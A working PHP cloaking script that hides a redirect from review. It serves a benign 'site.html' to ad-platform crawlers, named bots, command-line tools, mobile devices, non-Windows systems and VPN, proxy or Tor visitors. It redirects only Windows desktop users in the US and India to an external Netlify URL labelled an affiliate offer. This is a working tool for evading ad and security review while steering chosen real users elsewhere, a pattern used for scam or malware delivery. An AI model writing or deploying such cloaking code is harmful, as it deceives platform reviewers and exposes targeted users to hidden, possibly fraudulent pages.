<?php
error_reporting(0);
ini_set('display_errors', 0);

// =============================================
// AFFILIATE LINK - JAHAN REDIRECT KARNA HAI
$offer = "https://euphonious-souffle-660af0.netlify.app/";
$allowed_countries = ['US', 'IN'];
$desktop_only = true;
// =============================================

// IP GET KARO
$ip = '';
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ip = trim($_SERVER['REMOTE_ADDR']);
}

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ua_lower = strtolower($ua);

// BOT BLOCK
$bots = [
    'facebookexternalhit','facebot','facebook',
    'meta-externalagent','meta-externalfetcher',
    'googlebot','google-inspectiontool','googleother',
    'adsbot-google','mediapartners-google',
    'bingbot','msnbot','bingpreview',
    'twitterbot','linkedinbot','slackbot',
    'whatsapp','telegrambot','applebot',
    'semrushbot','ahrefsbot','mj12bot',
    'dotbot','rogerbot','screaming frog',
    'bot','crawler','spider','scraper',
    'curl','wget','python','java','ruby',
    'php','axios','postman','zgrab','masscan',
];
foreach ($bots as $b) {
    if (strpos($ua_lower, $b) !== false) {
        include 'site.html'; exit;
    }
}

// EMPTY UA
if (empty($ua) || strlen($ua) < 15) {
    include 'site.html'; exit;
}

// MOBILE BLOCK
if ($desktop_only) {
    $mobile_agents = [
        'mobile','android','iphone','ipad','ipod',
        'blackberry','windows phone','opera mini',
        'opera mobi','webos','symbian','nokia',
        'samsung','xiaomi',
    ];
    foreach ($mobile_agents as $m) {
        if (strpos($ua_lower, $m) !== false) {
            include 'site.html'; exit;
        }
    }
}

// WINDOWS ONLY CHECK
$is_windows = strpos($ua_lower, 'windows nt') !== false;
if (!$is_windows) {
    include 'site.html'; exit;
}

// VPN/PROXY BLOCK
$ctx = stream_context_create(['http' => ['timeout' => 4]]);
$proxy_res = @file_get_contents(
    "http://ip-api.com/json/{$ip}?fields=countryCode,proxy,hosting,tor",
    false, $ctx
);

$country = 'XX';
$is_proxy = false;

if ($proxy_res) {
    $proxy_data = json_decode($proxy_res, true);
    $country = $proxy_data['countryCode'] ?? 'XX';
    $is_proxy = ($proxy_data['proxy'] ?? false) ||
                ($proxy_data['hosting'] ?? false) ||
                ($proxy_data['tor'] ?? false);
}

if ($is_proxy) {
    include 'site.html'; exit;
}

// COUNTRY CHECK
if (in_array($country, $allowed_countries)) {
    header("Location: " . $offer, true, 302);
    exit;
}

include 'site.html';
exit;
?>
